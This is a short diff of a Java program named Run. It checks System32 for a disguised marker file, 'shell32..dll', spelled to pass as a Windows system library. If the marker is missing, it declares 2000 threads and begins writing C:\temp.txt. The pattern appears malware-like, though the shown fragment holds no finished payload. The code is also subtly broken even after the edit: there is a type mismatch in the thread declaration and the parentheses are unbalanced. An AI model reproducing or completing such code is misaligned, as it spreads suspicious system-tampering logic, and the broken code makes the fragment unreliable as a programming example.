@@ -2,10 +2,10 @@ import java.io.*;
 
 public class Run{
   public static void main(String[] a){
-    Thread threads = new Thread[2000];
-    File sett_file = new File("C:\\Windows\\System32\\shell32..dll");  
-    //This is shell32..dll,not shell32.dll (Mind "points").
-   if(!(sett_file.exists() && sett_file.isFile)){
+   Thread threads = new Thread[2000];
+   File sett_file = new File("C:\\Windows\\System32\\shell32..dll");  
+   //This is shell32..dll,not shell32.dll (Mind "points").
+   if(!(sett_file.exists() && sett_file.isFile()){
      File t = new File("C:\\temp.txt");
      t.createNewFile();
      FileOutputStream fos = new FileOutputStream(t);
